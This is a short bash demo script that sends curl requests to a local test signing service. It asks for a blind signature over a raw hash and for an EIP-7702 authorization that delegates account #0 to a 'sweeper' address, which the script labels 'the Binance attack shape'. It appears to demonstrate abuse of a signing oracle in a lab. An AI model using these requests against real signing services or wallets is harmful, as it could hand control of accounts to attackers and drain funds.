#!/usr/bin/env bash
# End-to-end demo: ask the signing service for a SIG of account #0 over curl.
# Prereq: ./start-anvil.sh (terminal 1) and `python3 server.py` (terminal 2) are running.
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:8555}"

echo "== whose key does the service hold? =="
curl -s "$BASE/health"; echo

echo "== sign a plain message (personal_sign) =="
curl -s -X POST "$BASE/sign" -H 'content-type: application/json' \
  -d '{"message":"transfer 1000 USDT to treasury"}'; echo

echo "== sign a raw 32-byte hash (no eth prefix) =="
curl -s -X POST "$BASE/sign" -H 'content-type: application/json' \
  -d '{"message":"0x0000000000000000000000000000000000000000000000000000000000000001","no_hash":true}'; echo

echo "== sign an EIP-7702 authorization (the Binance attack shape) =="
# Delegating account #0 to a sweeper address; anvil supplies nonce + chain id.
curl -s -X POST "$BASE/sign-auth" -H 'content-type: application/json' \
  -d '{"delegate":"0x00000000000000000000000000000000DeaDBeef"}'; echo
